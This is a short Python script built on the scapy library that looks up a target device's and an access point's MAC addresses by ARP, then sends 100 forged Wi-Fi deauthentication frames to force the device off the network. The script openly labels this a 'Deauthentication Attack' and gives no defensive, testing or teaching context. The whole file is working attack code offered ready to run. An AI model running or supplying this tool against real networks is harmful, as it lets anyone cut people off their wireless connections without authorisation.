import sys
from scapy.all import *

def get_mac_address(ip_address):

    try:
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
        arp_response = sr1(arp_request, timeout=2, verbose=False)
        if arp_response is not None:
            return arp_response.hwsrc
        else:
            return None
    except Exception as e:
        print(f"can't resolve MAC for {ip_address}: {e}")
        return None

def disconnect_user(mac_address, access_point, interface):
    try:
        packet = RadioTap() / Dot11(addr1=mac_address, addr2=access_point, addr3=access_point) / Dot11Deauth(reason=1)
        print(f"Sending 100 deauth packets to {mac_address} from AP {access_point} on {interface}...")
        sendp(packet, inter=0.01, count=100, iface=interface, verbose=0)
        print("Deauth packets sent successfully.")
    except Exception as e:
        print(f"Error sending deauth packets: {e}")
        sys.exit(1)

if __name__ == "__main__":

    if len(sys.argv) != 4:
        print("Usage: sudo python3 10.py <interface> <target_ip> <ap_ip>")
        sys.exit(1)


    interface = sys.argv[1]  # Must be in monitor mode (e.g., wlan0mon)
    target_ip = sys.argv[2]  # target device IP
    ap_ip = sys.argv[3]      # access point IP


    mac_address_access_point = get_mac_address(ap_ip)
    mac_address_device = get_mac_address(target_ip)

    if not mac_address_access_point or not mac_address_device:
        print("Failed to resolve MAC addresses. Ensure the devices are on the same network.")
        sys.exit(1)

    print(f"MAC Address of Access Point: {mac_address_access_point}")
    print(f"MAC Address of Device: {mac_address_device}")
    print(f"Starting Deauthentication Attack on Device: {mac_address_device}")
    disconnect_user(mac_address_device, mac_address_access_point, interface)